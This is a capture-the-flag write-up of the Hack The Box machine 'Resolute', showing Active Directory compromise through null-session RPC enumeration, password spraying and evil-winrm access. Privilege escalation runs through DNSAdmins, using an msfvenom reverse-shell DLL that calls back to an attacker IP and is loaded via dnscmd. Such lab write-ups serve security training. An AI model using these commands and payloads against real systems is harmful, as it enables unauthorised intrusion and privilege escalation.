---
description: https://app.hackthebox.com/machines/220
---

# 🐟 Resolute

<figure><img src="../../.gitbook/assets/image (999).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>

So we can see the domain is megabank.local, so let's add it to /etc/hosts file:

```
10.129.218.158  Resolute.megabank.local Resolute megabank.local
```

We then try enumerating SMB, we get anonymous login but no shares appears to be there

```
smbclient -L //10.129.218.158 
```

<figure><img src="../../.gitbook/assets/image (1001).png" alt=""><figcaption></figcaption></figure>

We could try using null auth or smbmap with:

```
smbmap -H 10.129.218.158
```

but nothing works

same for rpcclient:

```
rpcclient 10.129.218.158
```

But when we try null auth this times it works:

```
rpcclient -U "" -N 10.129.218.158
```

* **U ""**:
  * The `-U` option specifies the username to use for the connection. In this case, `""` (an empty string) means that no username is provided.
  * This can be useful for anonymous connections where the server does not require a username.
* **-N**:
  * The `-N` option tells `rpcclient` to use an anonymous login. This means that no password will be prompted for or provided. It is often used together with `-U ""` for anonymous access.

Then we use the enumdomusers to list some users in the domain:

<figure><img src="../../.gitbook/assets/image (1002).png" alt=""><figcaption></figcaption></figure>

We copy this output to a file and use awk to clean it:

```
cat enumdom.txt | awk -F\[ '{print $2}' | awk -F\] '{print $1}'
```

<figure><img src="../../.gitbook/assets/image (1003).png" alt=""><figcaption></figcaption></figure>

To continue enumeration, we could use cme to list out various info like password policy to look for lockout policy so we can bruteforce aggresivly:

```
cme smb --pass-pol 10.129.218.158 
```

<figure><img src="../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

While enumerating rpc, we can't forget to use the querydispinfo command that leads us to a clear text password:

<figure><img src="../../.gitbook/assets/image (1005).png" alt=""><figcaption><p>marko:Welcome123!</p></figcaption></figure>

So we exit rpcclient and hop on cme to test out the credentials

```
cme smb 10.129.218.158 -u marko -p 'Welcome123!'
```

But we get a login failure, so let's try spraying with the proper user list output :

```
cme smb 10.129.218.158 -u cleanedusers.txt -p 'Welcome123!'
```

<figure><img src="../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

and we get a hit for melanie :raised\_hands:

So we go on cme and test out the creds, it works, so we launch evil-winrm to connect via a session:

<figure><img src="../../.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

What we also need to do is enumerate SMB as an authd user ->

```
smbmap -d megabank.local -u melanie -p 'Welcome123!' -H 10.129.218.158
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we enumerate the session, we don't find anything in the home dir so we ho at root and run ls -force

The command `ls -force` as written appears to be a mix of Unix/Linux and PowerShell syntax, and it doesn't directly apply to Unix/Linux systems. Instead, it resembles a PowerShell command. In PowerShell, `ls` is an alias for the `Get-ChildItem` cmdlet, and the `-Force` parameter is used to show hidden and system files.

* **ls**:
  * An alias for the `Get-ChildItem` cmdlet, which lists the contents of a directory.
  * It functions similarly to the `ls` command in Unix/Linux, but it is a part of PowerShell and can be used on Windows systems.
* **-Force**:
  * A parameter for `Get-ChildItem` that forces the command to include hidden and system files in its output.
  * Without `-Force`, `Get-ChildItem` would only list the visible files and directories.

We find the interesting file:

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We continue our rabbit hole ->

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</p></figcaption></figure>

We look at the content of the file and we can see the creds for the ryan user:

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>ryan Serv3r4Admin4cc123!</p></figcaption></figure>

So obviously we pivot towards the ryan user using evil winrm ->

and look at the groups using `whoami /groups`

{% embed url="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins" %}

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Members of DNSAdmins group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions.
{% endhint %}

{% embed url="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2" %}

We follow the documentation, create a malicious dll with msfvenom as follows:&#x20;

```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=4444 -f dll > privesc.dll
```

then we need to transfer the file ->

{% embed url="https://blog.ropnop.com/transferring-files-from-kali-to-windows/" %}

So we will start by creating our smbserver with impacket ->

```
smbserver.py share .
```

`smbserver.py share .` is used to start an SMB (Server Message Block) server using the `smbserver.py` script from the Impacket library. This script allows you to quickly set up an SMB server on a specified share name and directory.

* **share**:
  * This is the name of the share that you are creating. When clients connect to the SMB server, they will use this share name to access the files.
  * For example, if you specify `share`, clients will access it via `\\<server-ip>\share`.
* **.**:
  * This indicates the directory to be shared. The `.` (dot) represents the current directory from which the command is being run.
  * All files and subdirectories within the current directory will be accessible through the SMB share.

Now launch netcat with the port of your msfvenom payload

{% hint style="info" %}
Some googling around for this group led me to the [lolbas page](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/) for `dnscmd` to load a dll over a UNC path. There’s a command to set a server level plugin dll:



dnscmd.exe /config /serverlevelplugindll \\\path\to\dll
{% endhint %}

```
dnscmd.exe /config /serverlevelplugindll \\10.10.14.58\share\privesc.dll
```

* `dnscmd.exe` is a command-line tool used to manage DNS servers.
* The `/config /serverlevelplugindll` option sets the path of a DLL that the DNS server will load as a plugin.
* `\\10.10.14.58\share\privesc.dll` specifies the path to your malicious DLL hosted on the SMB server.
* When this command is executed, the DNS server is configured to load the `privesc.dll` from the SMB share.

```
sc.exe \\resolute stop dns
```

```
sc.exe \\resolute start dns
```

* `sc.exe` is a command-line tool for managing Windows services.
* `sc.exe \\resolute stop dns` stops the DNS service on the target server (named `resolute`).
* `sc.exe \\resolute start dns` starts the DNS service again.
* Restarting the DNS service forces it to load the newly configured server-level plugin DLL (`privesc.dll`).

***

* When the DNS service starts, it loads the `privesc.dll` file from the SMB share.
* If `privesc.dll` contains a reverse shell payload, it will execute with the privileges of the DNS service, which can be high, potentially including domain admin privileges.
* During this process, when `dnscmd.exe` or the DNS service accesses the SMB share to retrieve the `privesc.dll`, the system may send NTLM authentication hashes to the SMB server.
* These hashes can be captured by tools like `Responder` or directly observed in the output of `smbserver.py`.

<figure><img src="../../.gitbook/assets/image (16) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
